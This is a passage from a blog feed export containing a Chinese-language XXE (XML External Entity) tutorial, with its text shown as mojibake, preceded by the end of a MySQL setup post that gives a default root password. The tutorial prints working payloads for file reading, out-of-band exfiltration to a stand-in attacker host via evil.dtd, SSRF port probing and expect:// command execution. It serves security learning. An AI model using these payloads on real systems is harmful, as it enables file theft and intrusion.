ä¸€ç‚¹ï¼š<br>[mysql]<br>socket&#x3D;&#x2F;tmp&#x2F;mysql.sock<br>æˆ–è€…è¿˜å¯ä»¥é€šè¿‡ä¿®æ”¹php.iniä¸­çš„é…ç½®æ¥ä½¿phpç”¨å…¶ä»–çš„mysql.sockæ¥è¿ï¼Œè¿™ä¸ªå¤§å®¶è‡ªå·±å»æ‰¾æ‰¾<br>ã€€ã€€<br>æˆ–è€…ç”¨è¿™æ ·çš„æ–¹æ³•:<br>ln -s &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock &#x2F;tmp&#x2F;mysql.sock</p></blockquote><p>ç„¶åè¿›è¡Œ <code>service mysql start</code> å°±å¯åŠ¨äº†ï¼Œæ³¨æ„è¿™é‡Œçš„mysqlçš„rootåˆå§‹å¯†ç æ˜¯<code>Admin2015</code>ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE åŸºç¡€æ±‡æ€»</title>
    <link href="/2020/02/13/xxe_basic/"/>
    <url>/2020/02/13/xxe_basic/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯XML"><a href="#ä»€ä¹ˆæ˜¯XML" class="headerlink" title="ä»€ä¹ˆæ˜¯XML"></a>ä»€ä¹ˆæ˜¯XML</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>å³ å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆExtensible Markup Languageï¼‰ï¼Œæ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œå…¶æ ‡ç­¾æ²¡æœ‰é¢„å®šä¹‰ï¼Œæ‚¨éœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ï¼Œæ˜¯W3Cçš„æ¨èæ ‡å‡†ã€‚å…¶äºHTMLçš„åŒºåˆ«æ˜¯ï¼š</p><ul><li>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®</li><li>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®</li></ul><p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬ï¼š</p><ul><li>XMLå£°æ˜</li><li>DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰</li><li>æ–‡æ¡£å…ƒç´ </li></ul><p>å…¸å‹çš„XMLæ–‡æ¡£</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--XMLå£°æ˜--&gt;</span><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-comment">&lt;!--DTDï¼Œè¿™éƒ¨åˆ†å¯é€‰çš„--&gt;</span>          <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span>                                                                          <br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¼•ç”¨ <a href="https://security.tencent.com/index.php/blog/msg/69">TSRCçš„ä¸€ç¯‡æ–‡ç« </a> çš„å›¾ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/13/1OcSx0.png" alt="1OcSx0.png"></p><h2 id="DTDï¼š"><a href="#DTDï¼š" class="headerlink" title="DTDï¼š"></a>DTDï¼š</h2><p>Document Type Definition å³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ï¼Œç”±äºå…¶æ”¯æŒçš„æ•°æ®ç±»å‹æœ‰é™ï¼Œæ— æ³•å¯¹å…ƒç´ æˆ–å±æ€§çš„å†…å®¹è¿›è¡Œè¯¦ç»†è§„èŒƒï¼Œåœ¨å¯è¯»æ€§å’Œå¯æ‰©å±•æ€§æ–¹é¢ä¹Ÿæ¯”ä¸ä¸ŠXML Schemaã€‚</p><p>DTDä¸€èˆ¬è®¤ä¸ºæœ‰ä¸¤ç§å¼•ç”¨æˆ–å£°æ˜æ–¹å¼ï¼š</p><ul><li>1ã€å†…éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨XMLæ–‡æ¡£ä¸­ã€‚</li><li>2ã€å¤–éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„DTDæ–‡ä»¶ï¼ˆ.dtdï¼‰ä¸­ã€‚</li></ul><p>DTDå®ä½“æœ‰ä»¥ä¸‹å‡ ç§å£°æ˜æ–¹å¼</p><h3 id="å†…éƒ¨å®ä½“"><a href="#å†…éƒ¨å®ä½“" class="headerlink" title="å†…éƒ¨å®ä½“"></a>å†…éƒ¨å®ä½“</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note [<br>    &lt;!ENTITY a &quot;flag&quot;&gt;<br>]&gt;<br>&lt;note&gt;&amp;a&lt;/note&gt;<br>&lt;!-- flag --&gt;<br></code></pre></td></tr></table></figure><h3 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;wust&quot;&gt;&quot;&gt;<br>    %b;<br>]&gt;<br>&lt;note&gt;&amp;b1&lt;/note&gt;<br>&lt;!-- wust --&gt;<br></code></pre></td></tr></table></figure><ul><li>å‚æ•°å®ä½“ç”¨<code>% name</code>ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>%name;</code>ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ã€‚</li><li>å…¶ä½™å®ä½“ç›´æ¥ç”¨<code>name</code>ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>&amp;name;</code>ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼Œå¯åœ¨xmlæ–‡æ¡£ä¸­å¼•ç”¨</li></ul><h3 id="å¤–éƒ¨å®ä½“"><a href="#å¤–éƒ¨å®ä½“" class="headerlink" title="å¤–éƒ¨å®ä½“"></a>å¤–éƒ¨å®ä½“</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;<br>]&gt;<br>&lt;note&gt;&amp;c&lt;/note&gt;<br>&lt;!-- eW91X25lZWRfYV9ncmlsZnJpZW5k --&gt;<br></code></pre></td></tr></table></figure><p>å¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒï¼Œä½†å­˜åœ¨ä¸€äº›é€šç”¨çš„åè®®ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://s2.ax1x.com/2020/02/13/1O6vPs.png" alt="1O6vPs.png"></p><p>ä¸Šå›¾æ˜¯é»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥æ”¯æŒå…¶ä»–ï¼Œå¦‚PHPæ”¯æŒçš„æ‰©å±•åè®®æœ‰</p><p><img src="https://s2.ax1x.com/2020/02/13/1O6X5j.png" alt="1O6X5j.png"></p><h3 id="å¤–éƒ¨å‚æ•°å®ä½“"><a href="#å¤–éƒ¨å‚æ•°å®ä½“" class="headerlink" title="å¤–éƒ¨å‚æ•°å®ä½“"></a>å¤–éƒ¨å‚æ•°å®ä½“</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note&gt; [<br>    &lt;!ENTITY % d SYSTEM &quot;http://ctf.w-ais.cn/xml.dtd&quot;&gt;<br>    %d;<br>]&gt;<br>&lt;note&gt;&amp;d1&lt;/note&gt;<br>&lt;!-- eW91X25lZWRfYV9ncmlsZnJpZW5k --&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!-- http://ctf.w-ais.cn/xml.dtd --&gt;<br>&lt;!ENTITY d1 SYSTEM &quot;data://text/plain;base64,eW91X25lZWRfYV9ncmlsZnJpZW5k&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>å†…éƒ¨å£°æ˜DTD</strong><br><code>æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code><br><strong>å¼•ç”¨å¤–éƒ¨DTD</strong><br><code>æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</code><br>æˆ–è€…<br><code>æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot; &quot;æ–‡ä»¶å&quot;&gt;</code></p><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p><p><strong>å†…éƒ¨å£°æ˜å®ä½“</strong><br><code>å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></p><p><strong>å¼•ç”¨å¤–éƒ¨å®ä½“</strong><br><code>å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</code><br>æˆ–è€…<br><code>å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p><h1 id="XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XML-External-Entity"><a href="#XMLå¤–éƒ¨å®ä½“æ³¨å…¥-XML-External-Entity" class="headerlink" title="XMLå¤–éƒ¨å®ä½“æ³¨å…¥(XML External Entity)"></a><strong>XML</strong>å¤–éƒ¨å®ä½“æ³¨å…¥(XML External Entity)</h1><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h2><p>ä¸€èˆ¬xxeåˆ©ç”¨åˆ†ä¸ºä¸¤å¤§åœºæ™¯ï¼šæœ‰å›æ˜¾å’Œæ— å›æ˜¾ã€‚</p><p>æœ‰å›æ˜¾çš„æƒ…å†µå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°Payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ï¼Œæ— å›æ˜¾çš„æƒ…å†µåˆç§°ä¸ºBlind XXEï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®é€šé“æå–æ•°æ®ã€‚</p><h4 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h4><h5 id="æ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“"><a href="#æ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“" class="headerlink" title="æ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“"></a>æ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="æ¶æ„å¼•å…¥å¤–éƒ¨å‚æ•°å®ä½“"><a href="#æ¶æ„å¼•å…¥å¤–éƒ¨å‚æ•°å®ä½“" class="headerlink" title="æ¶æ„å¼•å…¥å¤–éƒ¨å‚æ•°å®ä½“"></a>æ¶æ„å¼•å…¥å¤–éƒ¨å‚æ•°å®ä½“</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps-ip/payload.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %file;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h4><p><a href="https://www.freebuf.com/vuls/207639.html">Blind XXEè¯¦è§£ä¸Google CTFä¸€é“é¢˜åˆ†æ</a></p><h5 id="OOB-out-of-band"><a href="#OOB-out-of-band" class="headerlink" title="OOB(out-of-band)"></a>OOB(<strong>out-of-band</strong>)</h5><p>å…ˆä½¿ç”¨php:&#x2F;&#x2F;filterè¯»å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥httpè¯·æ±‚å‘é€åˆ°æ¥å—æ•°æ®çš„æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %dtd;</span><br><span class="hljs-meta">    %send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtdçš„å†…å®¹ï¼Œå†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ<code>&amp;#x25</code>ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span><br><span class="hljs-meta">    <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span><br><span class="hljs-meta">&gt;</span><br>%all;<br></code></pre></td></tr></table></figure><p>è§¦å‘XXEæ”»å‡»åï¼ŒæœåŠ¡å™¨ä¼šæŠŠæ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…ç½‘ç«™</p><h5 id="åŸºäºæŠ¥é”™"><a href="#åŸºäºæŠ¥é”™" class="headerlink" title="åŸºäºæŠ¥é”™"></a>åŸºäºæŠ¥é”™</h5><blockquote><p>åŸºäºæŠ¥é”™çš„åŸç†å’ŒOOBç±»ä¼¼ï¼ŒOOBé€šè¿‡æ„é€ ä¸€ä¸ªå¸¦å¤–çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œè€ŒåŸºäºæŠ¥é”™æ˜¯æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚<br>æ‰€ä»¥å’ŒOOBçš„æ„é€ æ–¹å¼å‡ ä¹åªæœ‰urlå‡ºä¸åŒï¼Œå…¶ä»–åœ°æ–¹ä¸€æ¨¡ä¸€æ ·ã€‚</p></blockquote><p>é€šè¿‡å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE message [<br>    &lt;!ENTITY % remote SYSTEM &quot;http://vps/xml.dtd&quot;&gt;<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;<br>    %remote;<br>    %send;<br>]&gt;<br>&lt;message&gt;1234&lt;/message&gt;<br></code></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!-- xml.dtd --&gt;<br>&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;<br>%start;<br></code></pre></td></tr></table></figure><p>é€šè¿‡å¼•å…¥æœ¬åœ°æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE message [<br>    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;<br>    &lt;!ENTITY % ISOamso &#x27;<br>        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;<br>        &amp;#x25;eval;<br>        &amp;#x25;send;<br>    &#x27;&gt; <br>    %remote;<br>]&gt;<br>&lt;message&gt;1234&lt;/message&gt;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªè°ƒç”¨çš„å‚æ•°å®ä½“æ˜¯<code>%remote</code>ï¼Œåœ¨<code>/usr/share/yelp/dtd/docbookx.dtd</code>æ–‡ä»¶ä¸­è°ƒç”¨äº†<code>%ISOamso</code>;åœ¨<code>ISOamso</code>å®šä¹‰çš„å®ä½“ä¸­ç›¸ç»§è°ƒç”¨äº†<code>eval</code>ã€å’Œ<code>send</code>ã€‚</p><h2 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h2><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )ï¼Œè¯´ç™½äº†å°±æ˜¯å€ŸåŠ©æ¼æ´å®ç°å†…ç½‘æ¢æµ‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>        <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1/1.txt&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿™é‡Œçš„127.0.0.1å¯ä»¥æ›¿æ¢æˆä»»æ„ä½ æƒ³è¦çš„å†…ç½‘åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€Ÿæ­¤å®ç°å¯¹å†…ç½‘çš„æ¢æµ‹ã€‚å’Œè¯»æ–‡ä»¶å·®ä¸å¤šï¼Œåªä¸è¿‡æŠŠURIæ”¹æˆå†…ç½‘æœºå™¨åœ°å€ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥æ¢æµ‹å†…ç½‘çš„ç«¯å£</p><p><img src="https://s2.ax1x.com/2020/02/13/1O6xGn.png" alt="1O6xGn.png"></p><p><img src="https://s2.ax1x.com/2020/02/13/1O6z2q.png" alt="1O6z2q.png"></p><p>æ¢æµ‹192.168.1.1çš„80ã€81ç«¯å£ï¼Œé€šè¿‡è¿”å›çš„â€œConnection refusedâ€å¯ä»¥çŸ¥é“è¯¥81ç«¯å£æ˜¯closedçš„ï¼Œè€Œ80ç«¯å£æ˜¯opençš„ã€‚</p><h2 id="RCE-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ-Remote-Command-x2F-Code-Execute"><a href="#RCE-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ-Remote-Command-x2F-Code-Execute" class="headerlink" title="RCE(è¿œç¨‹å‘½ä»¤æ‰§è¡Œ Remote Command&#x2F;Code Execute)"></a>RCE(è¿œç¨‹å‘½ä»¤æ‰§è¡Œ Remote Command&#x2F;Code Execute)</h2><p>è¿™ç§æƒ…å†µå¾ˆå°‘è§ï¼Œå¹¶ä¸æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œåªæ˜¯å› ä¸ºç¯å¢ƒçš„ç‰¹æ®Šé…ç½®ï¼Œå¯¼è‡´XMLä¸æŸäº›å‘½ä»¤æ“ä½œå…³è”ï¼Œè¿›è€Œé€ æˆäº†å‘½ä»¤æ‰§è¡Œã€‚å³æœ‰äº›æƒ…å†µä¸‹æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡XXEæ‰§è¡Œä»£ç ï¼Œè¿™ä¸»è¦æ˜¯ç”±äºé…ç½®ä¸å½“&#x2F;å¼€å‘å†…éƒ¨åº”ç”¨å¯¼è‡´çš„ã€‚å¦‚æœæˆ‘ä»¬è¶³å¤Ÿå¹¸è¿ï¼Œå¹¶ä¸”PHP expectæ¨¡å—è¢«åŠ è½½åˆ°äº†æ˜“å—æ”»å‡»çš„ç³»ç»Ÿæˆ–å¤„ç†XMLçš„å†…éƒ¨åº”ç”¨ç¨‹åºä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">GVI</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">catalog</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">core</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test101&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>John, Doe<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>I love XML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">category</span>&gt;</span>Computers<span class="hljs-tag">&lt;/<span class="hljs-name">category</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>9.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>2018-10-01<span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span 